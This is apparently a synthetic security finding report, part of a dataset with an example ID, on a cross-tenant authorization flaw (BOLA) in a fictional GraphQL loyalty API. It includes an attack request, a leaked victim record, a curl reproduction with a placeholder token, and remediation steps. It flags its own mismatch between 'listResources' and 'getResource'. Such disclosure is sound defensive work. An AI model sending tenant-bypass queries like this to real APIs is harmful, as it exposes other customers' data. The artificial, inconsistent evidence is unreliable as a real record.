# Security Analysis Report
**System:** RewardCore Loyalty API
**Domain:** Retail / Loyalty Platform
**Example ID:** GQL-0273
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 1.10 | Cross-service identity propagation drift on `getResource` / `listResources` — attacker reads loyalty records outside their identity scope |

---

## Finding 1 — BOLA: Cross-Service Identity Propagation Drift (Pattern 1.10)

### Summary
The GraphQL API at `https://api.rewardcore-loyalty-a.example.com/graphql` allows a caller's identity to drift between services without consistent re-validation. The resolver fetches by `tenantId` filter supplied from the client without verifying against the JWT `tenantId` claim, allowing a user to read loyalty records belonging to `tenant-bdcf`.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-bdcf")` while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-6249bdcf` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 1.10 — Cross-service identity propagation drift (BOLA)
**Affected endpoint:** `POST https://api.rewardcore-loyalty-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.rewardcore-loyalty-a.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listResources(tenantId: \"tenant-bdcf\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim Loyalty Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-bdcf",
      "ownerId": "other-user-6249bdcf",
      "data": {
        "sensitiveField": "CONFIDENTIAL-6249bdcf",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.rewardcore-loyalty-a.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-bdcf\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-bdcf, sensitiveField: CONFIDENTIAL-6249bdcf
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must ignore client-supplied `tenantId` and inject from JWT server-side.
2. All downstream service calls must re-validate identity context — do not propagate client `tenantId` claims unchecked.
3. Redis cache key must include tenant dimension.
